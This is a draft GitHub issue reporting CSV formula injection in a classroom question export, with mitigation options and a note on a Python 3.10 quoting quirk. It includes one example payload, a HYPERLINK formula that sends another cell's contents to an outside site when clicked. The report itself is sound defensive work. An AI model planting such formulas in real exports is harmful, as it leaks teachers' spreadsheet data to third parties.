DRAFT, not filed. Filed only on the owner's yes, with:
gh issue create --repo Natenc12/pipeline-lab --label needs-triage --title "<title below>" --body-file <this body>

Title: CSV export: student text starting with = + - @ becomes a live formula in spreadsheets

## Problem

`export_class_questions` (issue #4) writes question text and student names exactly as stored. When a
teacher opens the CSV in Excel or Google Sheets, a cell that starts with `=`, `+`, `-` or `@` is
treated as a formula ("CSV injection"). Students type the question text, so a student can put a
formula into the teacher's spreadsheet, e.g.
`=HYPERLINK("https://example.com/?"&B2,"Click for the answer")`, which sends another cell's contents
to an outside site when clicked.

## Why it matters

The export exists so teachers can open it in a spreadsheet. Some spreadsheets warn about the worst
forms, but not all.

## Options to decide at triage

- Prefix any field starting with `= + - @`, tab or `\r` with a single quote `'` (OWASP's advice).
  Cost: a real question like `-5 squared?` shows as `'-5 squared?` in a plain-text viewer.
- Leave the data exact and warn teachers in the docs / CLI once an export command exists.

Related: on Python 3.10 (CI's version) `csv.writer(lineterminator="\n")` does not quote a field
containing a lone `\r`, so such a question splits its row in a spreadsheet; Python 3.11+ quotes it.
Accepted as-is in #4; could be fixed in the same change.

Found while working #4 (PR #17).
